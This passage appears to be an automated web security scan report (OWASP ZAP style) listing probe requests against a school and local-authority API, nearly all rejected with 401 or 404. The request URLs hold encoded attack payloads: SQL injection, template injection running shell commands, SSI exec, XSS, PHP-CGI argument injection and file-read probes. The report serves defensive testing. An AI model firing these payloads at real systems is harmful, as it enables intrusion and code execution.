* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names+AND+1%253D1+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names+AND+1%253D2+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names+and+exists+%2528+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527%2529+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names+and+exists+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names+or+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names+OR+1%253D1+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names+UNION+ALL+select+NULL+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names+where+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names0W45pz4p
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=response.write%2528758%252C919*211%252C285%2529
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=Set-cookie%253A+Tamper%253D841613ad-d638-4fe4-b29f-b70689cd5927
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=suggest
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=system-property%2528%2527xsl%253Avendor%2527%2529%252F%253E
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=thishouldnotexistandhopefullyitwillnot
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=type+%2525SYSTEMROOT%2525%255Cwin.ini
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=URL%253D%2527http%253A%252F%252F980414377652208366.owasp.org%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=WEB-INF%252Fweb.xml
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=WEB-INF%255Cweb.xml
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=www.google.com
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=www.google.com%252F
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=www.google.com%252Fsearch%253Fq%253DZAP
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=www.google.com%253A80%252F
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=www.google.com%253A80%252Fsearch%253Fq%253DZAP
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=ZAP
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=ZAP%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%250A
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=ZAP+%25251%2521s%25252%2521s%25253%2521s%25254%2521s%25255%2521s%25256%2521s%25257%2521s%25258%2521s%25259%2521s%252510%2521s%252511%2521s%252512%2521s%252513%2521s%252514%2521s%252515%2521s%252516%2521s%252517%2521s%252518%2521s%252519%2521s%252520%2521s%252521%2521n%252522%2521n%252523%2521n%252524%2521n%252525%2521n%252526%2521n%252527%2521n%252528%2521n%252529%2521n%252530%2521n%252531%2521n%252532%2521n%252533%2521n%252534%2521n%252535%2521n%252536%2521n%252537%2521n%252538%2521n%252539%2521n%252540%2521n%250A
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=zApPX0sS
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=ZgQpkMLpwciprDTUUuuTXSVqcwkDIacJGmeXBjPcZQEpEbULndGybPNUeoyKRmoOqEFOhUHuNLUGZUynIYIsBWvaotPMqdSsFNRTtVheAStaGFnnNynPVIUTxKUIEYUgsnBqoOItNxjNmwCtJiBajvpaylOmtIZPEOniXFCyqwXDPZWATekGNFtuFvPXPHcFYTfAPoTHfFVdnQkxipmdSnVCPdbpxueOVlIBuiifMwFqkZQknuvMVXgfAATOckjTxbrSGOeqHXvqbBfWLGvDEbHYeWxvJqmhHHZwmurFodZECqgyqaCwnkGmMscZgNcknXYfaWxXyDgUQRguoEJcwBkctevMUCwvOtusuBdmwyEqLYUYYeygEiZMPvLeZVgLTpftcOHRkSmkJrcdOErbmGHgyXvsHjEgNDivMRImTVsmlLrkhbyQJHlwgGsedGWkVKktQtOpavVqPKJfZFSsnUiJPSgnmRuTGEWxBeTvyFXIIHAuFgWPkhZvxGuphVwLiwZYJcsuOGuNhEiAUqDRnBZYVciWJrAQUojDfoxUQalKLEKaGHrMOZfMqZBEZEtYvbbvipbfLKvIaBReALLdvgAQdOXThPHqkjZVtowyEygwMPOPhijIYkNoYyvCtrvePmMtGLwjNTvAMVQroNyRkjdjycIIpTRkaBZKKbpcvcOQCBjekwoIlnTHtxcfBDBMZitsKiVQTQXmqaxLDtrAeKWofQLnoENdkfqfwnpdwoPWCfgRdYwkvsXYtfsaylBBMvAFbZSLxCRtrNdgCkKZObHbgptWveZyxtdJLKpNBsvmjowtXQNmWlcgqIqrAxnKQttiamRkAFgyULpYTRNPqpghMBnxFwGwcqxKjVJZoKVWlMOYmvAsUeTmicVmtwOERVMrLZufKUwWMQUAiAHteovwwwpuLLQQscLqapGQnuEExUCFTiRvSQtexENarCrfvRMlesWXLkUftiGKqyDsuPCqvmMhgSXBkAuhPBKYEQtTvnpHiqDHLHKYRQTutVpBnhZTilnqJKKZrtQRkhHqpWRlqYhFcjKtBtSUZsFUawseThoGwNpjmCMttoOjqkpHZOaUpxHMgLVSdymWsJGomkpiKqmOkBfVCqvlWSMTPDWNljlKepGARdigBVCUTbnPrxYkwDSwCHJxBHCrQlRoQDwGJmqhqhvphgBBVAIsfrQsyhbCINlIkCwYqifRncFElFfKLHyuKWaKKHVVmPtsMWmOuyOxoJbaNuLSJkLbIamVZvhdRAapmCbPNSxaEGKTKEepHvcsjUxokYtbvRqvFOxZfupxTaXUojQlkcodCpZgFddAYhcWwCEhlIgdBOmslcyJoEUlngGHGnrRIVeTCvmdkeSktUNoBtwAFcLLNIvfOUMExFKXGMFfppDwtuirifjkJpZNkcteiXobOegpFCjyTpuYeGQIGGqXqTGcLuFGEwmZGecerrLomVbnHasQKKaEoflxDZNrWMFWEDlLSKITIENpBiPNvmOvixtLorCvjPvpoIRgfqthoOHOQKFyelwITdpJdknYaHMSEWAEGyZoCMkVDxtmhwfEOjjcermJbSkucjZhQPYVHCwvXDXsrJatWPfIaWDcONVLIWiZQDIhXkYxqZeRimWYnFJurHEQMjWbOHUWwVQtDNZNTIWBAQQBOFLBHqKuvTfObAWSrLmPDMxpPcyMMsQtpaEqsGTHwxdkbJZRCSKqnvQxlaISiZMxVnAbmBnkWkkrOpvsugUfZTeuHZHrZHaFPANlERftXSiXAsqvEWrmdhebEQPfcYpvWBhRxsmbkAJajUuSUIYDSNCrdWNfUihSPqdofbVekulAxayLTvHupZbpVEVaeGRtonuKBbxreKTVvCPhBvHSHaayVqYmWeqboMndIAYAsxLibpUTrRZUxmrVnwbOASZrlJUXrbqDxOHhbdhkTrvamdLxsxTYlSpUTHPAKKbadbNlxaUhVCxdXsrbXqvDFlTPtaZqLrhydxvhidiaLbZqVBpxPjYsAmYQcDdkfpXgYjAsIImaKaKIfxxdILhRJEqRlNEfOXjWLMIoiRPKPvByQedfBIpKfiyindJqCinjjXdfGACU
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=zj%2523%257B9876*9825%257Dzj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=zj%2523set%2528%2524x%253D9041*7096%2529%2524%257Bx%257Dzj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=zj%2524%257B5855*8292%257Dzj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=zj%253C%2525%253D5619*9148%2525%253Ezj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=zj%253Cp+th%253Atext%253D%2522%2524%257B6176*6205%257D%2522%253E%253C%252Fp%253Ezj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=zj%257B%25233142*5927%257Dzj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=zj%257B%25404043*1242%257Dzj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=zj%257B%2540math+key%253D%25228652%2522+method%253D%2522multiply%2522+operand%253D%25226207%2522%252F%257Dzj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=zj%257B%257B%253D2156*1755%257D%257Dzj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=zj%257B%257B1309*6230%257D%257Dzj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=zj%257B%257B57200%257Cadd%253A51820%257D%257Dzj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=zj%257B%257Bprint+%25229353%2522+%25228913%2522%257D%257Dzj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=zj%257B9839*8448%257Dzj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=zj+2690*8274+zj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authority
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authority/identifier
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authority/identifier%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authority%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/school
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/school/identifier
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/school/identifier/comparators
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/school/identifier/comparators/
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/school/identifier/comparators%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/school/identifier%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/school%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest/
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%2522
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%2522%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%2522%252Bresponse.write%2528569%252C959*336%252C305%2529%252B%2522
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%2522%252F%253E%253Cxsl%253Avalue-of+select%253D%2522system-property%2528%2527xsl%253Avendor%2527%2529%2522%252F%253E%253C%2521--
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%2522%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%2522%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B%2524var%253D%2522
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%2522%253E%253C%2521--%2523EXEC+cmd%253D%2522dir+%255C%2522--%253E%253C
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%2522%253E%253C%2521--%2523EXEC+cmd%253D%2522ls+%252F%2522--%253E%253C
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%2522case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%2522java.lang.Thread.sleep%2522%252815000%2529
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%2523%257B%2525x%2528sleep+15%2529%257D
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%2523%257Bglobal.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529%257D
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%2523set%2528%2524engine%253D%2522%2522%2529%250A%2523set%2528%2524proc%253D%2524engine.getClass%2528%2529.forName%2528%2522java.lang.Runtime%2522%2529.getRuntime%2528%2529.exec%2528%2522sleep+15%2522%2529%2529%250A%2523set%2528%2524null%253D%2524proc.waitFor%2528%2529%2529%250A%2524%257Bnull%257D
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%2524%257B%2540print%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%257D
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%2524%257B%2540print%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%257D%255C
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%2524%257B__import__%2528%2522subprocess%2522%2529.check_output%2528%2522sleep+15%2522%252C+shell%253DTrue%2529%257D
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%2527%2522%2500%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%2527%2522%253Cimg+src%253Dx+onerror%253Dprompt%2528%2529%253E
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%2527%2522%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%2527%2528
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%2527%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%2527%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B%2524var%253D%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%2527case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%2529%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%252Bresponse.write%2528%257B0%257D*%257B1%257D%2529%252B
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%252F
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%252F%252F980414377652208366.owasp.org
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
